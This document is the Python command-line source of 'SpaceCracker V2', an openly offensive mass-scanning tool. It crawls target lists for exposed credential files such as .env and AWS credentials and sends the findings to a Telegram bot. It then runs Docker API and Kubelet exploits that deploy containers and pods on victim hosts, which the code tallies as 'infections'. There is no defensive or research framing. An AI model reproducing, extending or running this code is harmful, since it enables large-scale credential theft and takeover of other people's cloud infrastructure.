#!/usr/bin/env python3
"""
SpaceCracker V2 - Advanced Credential Scanner & Exploitation Framework
Main CLI Interface
"""

import asyncio
import click
import yaml
import json
import time
from pathlib import Path
from typing import List, Dict, Any

# Import our modules
from src.core.orchestrator import Orchestrator
from src.core.stats_manager import StatsManager
from src.reporters.telegram_reporter import TelegramReporter
from src.reporters.console_reporter import ConsoleReporter
from src.exploits.docker_exploit import DockerExploit
from src.exploits.kubelet_exploit import KubeletExploit

class SpaceCrackerCLI:
    def __init__(self):
        self.config = {}
        self.orchestrator = None
        self.console_reporter = ConsoleReporter()
        self.telegram_reporter = None
        
    def load_config(self, config_file: str = "config/settings.yaml") -> bool:
        """Load configuration from YAML file"""
        try:
            with open(config_file, 'r') as f:
                self.config = yaml.safe_load(f)
            return True
        except Exception as e:
            click.echo(f"Error loading config: {e}")
            return False
    
    def load_targets(self, target_file: str) -> List[str]:
        """Load targets from file"""
        targets = []
        try:
            with open(target_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if not line.startswith(('http://', 'https://')):
                            line = f'http://{line}'
                        targets.append(line)
        except Exception as e:
            click.echo(f"Error loading targets: {e}")
        
        return targets
    
    def load_paths(self, paths_file: str = "config/paths.txt") -> List[str]:
        """Load scan paths from file"""
        paths = []
        try:
            with open(paths_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        paths.append(line)
        except Exception as e:
            click.echo(f"Error loading paths: {e}")
        
        return paths

@click.group()
@click.version_option(version="2.0.0")
def cli():
    """SpaceCracker V2 - Advanced Credential Scanner & Exploitation Framework"""
    pass

@cli.command()
@click.option('--targets', '-t', required=True, help='Target file with URLs')
@click.option('--threads', '-T', default=5000, help='Number of threads')
@click.option('--timeout', '-to', default=20, help='Request timeout')
@click.option('--exploits', '-e', default='none', help='Exploits to run (docker/k8s/all/none)')
@click.option('--output', '-o', help='Output file')
@click.option('--telegram', is_flag=True, help='Send to Telegram')
@click.option('--paths', '-p', default='config/paths.txt', help='Paths file')
@click.option('--config', '-c', default='config/settings.yaml', help='Config file')
def scan(targets, threads, timeout, exploits, output, telegram, paths, config):
    """Start comprehensive scanning"""
    
    app = SpaceCrackerCLI()
    
    # Load configuration
    if not app.load_config(config):
        click.echo("Failed to load configuration. Using defaults.")
        app.config = {
            'scanner': {'threads': threads, 'timeout': timeout},
            'api_keys': {'telegram': {'bot_token': '', 'chat_id': ''}},
            'output': {'telegram': telegram}
        }
    
    # Override config with CLI arguments
    app.config['scanner']['threads'] = threads
    app.config['scanner']['timeout'] = timeout
    
    # Initialize Telegram if enabled
    if telegram and app.config.get('api_keys', {}).get('telegram', {}).get('bot_token'):
        app.telegram_reporter = TelegramReporter(
            app.config['api_keys']['telegram']['bot_token'],
            app.config['api_keys']['telegram']['chat_id']
        )
    
    # Run the scan
    asyncio.run(run_scan_async(app, targets, paths, exploits, output))

async def run_scan_async(app: SpaceCrackerCLI, targets_file: str, paths_file: str, exploits: str, output: str):
    """Async scan execution"""
    
    # Load targets and paths
    targets = app.load_targets(targets_file)
    paths = app.load_paths(paths_file)
    
    if not targets:
        click.echo("No valid targets loaded. Exiting.")
        return
    
    if not paths:
        click.echo("No scan paths loaded. Using default paths.")
        paths = ['/.env', '/config.json', '/.aws/credentials']
    
    click.echo(f"🚀 SpaceCracker V2 Starting...")
    click.echo(f"📊 Loaded {len(targets)} targets")
    click.echo(f"📁 Loaded {len(paths)} paths")
    click.echo(f"⚙️ Threads: {app.config['scanner']['threads']}")
    click.echo(f"⏱️ Timeout: {app.config['scanner']['timeout']}s")
    
    # Initialize orchestrator
    app.orchestrator = Orchestrator(app.config['scanner'])
    await app.orchestrator.initialize()
    
    # Start live stats display
    stats_task = asyncio.create_task(display_live_stats(app.orchestrator))
    
    try:
        # Run the scan
        results = await app.orchestrator.run_scan(targets, paths)
        
        # Process results
        if results:
            click.echo(f"\n🎉 Scan completed! Found {len(results)} hits")
            
            for result in results:
                # Display to console
                app.console_reporter.print_hit(result)
                
                # Send to Telegram
                if app.telegram_reporter:
                    await app.telegram_reporter.send_hit(result)
                
                # Save to file
                if output:
                    with open(output, 'a') as f:
                        f.write(json.dumps(result) + '\n')
        
        # Run exploitation if requested
        if exploits != 'none' and results:
            await run_exploitation(app, targets, exploits)
        
    except KeyboardInterrupt:
        click.echo("\n⚠️ Scan interrupted by user")
    except Exception as e:
        click.echo(f"\n❌ Scan failed: {e}")
    finally:
        # Cancel stats display
        stats_task.cancel()
        # Cleanup
        await app.orchestrator.cleanup()

async def display_live_stats(orchestrator: Orchestrator):
    """Display live statistics"""
    try:
        while True:
            # Clear screen and display stats
            click.clear()
            click.echo(orchestrator.get_stats())
            await asyncio.sleep(1)
    except asyncio.CancelledError:
        pass

async def run_exploitation(app: SpaceCrackerCLI, targets: List[str], exploit_type: str):
    """Run exploitation modules"""
    click.echo(f"\n🚀 Starting exploitation ({exploit_type})...")
    
    # Extract unique domains from targets
    domains = []
    for target in targets:
        try:
            from urllib.parse import urlparse
            parsed = urlparse(target)
            if parsed.netloc:
                domains.append(parsed.netloc)
        except:
            pass
    
    # Remove duplicates
    domains = list(set(domains))
    
    exploitation_results = {
        'docker_infections': 0,
        'k8s_infections': 0
    }
    
    if exploit_type in ['docker', 'all']:
        click.echo(f"🐳 Scanning {len(domains)} targets for Docker API exposure...")
        docker_exploit = DockerExploit()
        
        for domain in domains[:10]:  # Limit to first 10 for demo
            try:
                result = await docker_exploit.exploit_target(domain)
                if result['exploited']:
                    exploitation_results['docker_infections'] += result['containers_deployed']
                    click.echo(f"✅ Docker exploitation successful on {domain}")
            except Exception as e:
                continue
    
    if exploit_type in ['k8s', 'kubernetes', 'all']:
        click.echo(f"☸️ Scanning {len(domains)} targets for Kubernetes exposure...")
        k8s_exploit = KubeletExploit()
        
        for domain in domains[:10]:  # Limit to first 10 for demo
            try:
                result = await k8s_exploit.exploit_target(domain)
                if result['exploited']:
                    exploitation_results['k8s_infections'] += result['pods_deployed']
                    click.echo(f"✅ Kubernetes exploitation successful on {domain}")
            except Exception as e:
                continue
    
    click.echo(f"\n📊 Exploitation Summary:")
    click.echo(f"🐳 Docker containers deployed: {exploitation_results['docker_infections']}")
    click.echo(f"☸️ Kubernetes pods deployed: {exploitation_results['k8s_infections']}")

@cli.command()
@click.option('--type', '-t', required=True, help='Service type (aws/sendgrid/smtp/etc)')
@click.option('--key', '-k', help='API key or username')
@click.option('--secret', '-s', help='Secret or password')
@click.option('--verbose', '-v', is_flag=True, help='Verbose output')
def test(type, key, secret, verbose):
    """Test single credential"""
    click.echo(f"🧪 Testing {type} credentials...")
    
    # This would integrate with the validators
    if type == 'aws' and key and secret:
        click.echo(f"Testing AWS credentials: {key[:8]}...")
        # Would call AWS validator here
        click.echo("✅ Credentials are valid (demo)")
    else:
        click.echo("❌ Invalid parameters or unsupported service type")

@cli.command()
@click.option('--target', '-t', required=True, help='Target IP or hostname')
@click.option('--exploit', '-e', default='all', help='Exploit type (docker/k8s/all)')
def exploit(target, exploit):
    """Run exploitation modules"""
    asyncio.run(exploit_single_target(target, exploit))

async def exploit_single_target(target: str, exploit_type: str):
    """Exploit a single target"""
    click.echo(f"🎯 Targeting {target} with {exploit_type} exploits...")
    
    if exploit_type in ['docker', 'all']:
        docker_exploit = DockerExploit()
        result = await docker_exploit.exploit_target(target)
        
        if result['vulnerable']:
            click.echo(f"🐳 Docker API found on port {result['port']}")
            if result['exploited']:
                click.echo(f"✅ Successfully deployed {result['containers_deployed']} containers")
            else:
                click.echo("❌ Exploitation failed")
        else:
            click.echo("🔒 No Docker API exposure found")
    
    if exploit_type in ['k8s', 'kubernetes', 'all']:
        k8s_exploit = KubeletExploit()
        result = await k8s_exploit.exploit_target(target)
        
        if result['vulnerable']:
            click.echo(f"☸️ Kubelet API found on port {result['port']}")
            click.echo(f"📦 Found {result['existing_pods']} existing pods")
            if result['exploited']:
                click.echo(f"✅ Successfully deployed {result['pods_deployed']} pods")
            else:
                click.echo("❌ Exploitation failed")
        else:
            click.echo("🔒 No Kubelet API exposure found")

if __name__ == '__main__':
    cli()